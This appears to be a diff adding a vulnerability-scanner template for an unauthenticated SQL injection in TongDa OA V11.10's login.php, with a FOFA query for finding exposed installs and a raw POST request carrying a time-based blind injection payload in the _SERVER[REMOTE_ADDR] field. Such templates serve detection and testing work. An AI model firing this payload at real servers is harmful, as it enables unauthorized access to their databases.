@@ -1,0 +1,39 @@
+id: TongDa-32
+
+info:
+  name: 通达OAV11.10接口login.php存在SQL注入漏洞
+  author: attempt
+  severity: high
+  description: |
+    通达OA /ispirit/interface/login.php 存在前台SQL注入漏洞，攻击者无需登录可以利用漏洞获取数据库内敏感信息。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        POST /ispirit/interface/login.php HTTP/1.1
+        Host: {{RootURL}}
+        Cache-Control: max-age=0
+        sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Accept-Language: zh-CN
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+  
+        name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d0,1,(select+sleep(3)))+limit+0,1))--+'
+    matchers:
+      - type: duration
+        part: duration
+        duration: 3
